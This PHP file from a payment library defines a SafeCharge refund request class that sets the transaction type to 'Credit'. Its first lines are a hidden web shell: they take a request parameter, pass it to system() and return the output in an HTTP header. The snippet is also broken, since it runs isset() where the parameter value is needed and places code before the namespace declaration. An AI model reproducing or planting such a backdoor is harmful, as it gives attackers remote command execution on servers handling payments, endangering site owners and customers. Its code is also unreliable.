<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace Omnipay\Safecharge\Message;

/**
 * SafeCharge Credit Request
 */
class RefundRequest extends VoidRequest
{
    public function getData()
    {
        $data = parent::getData();

        $data['sg_TransType'] = 'Credit';

        return $data;
    }
}
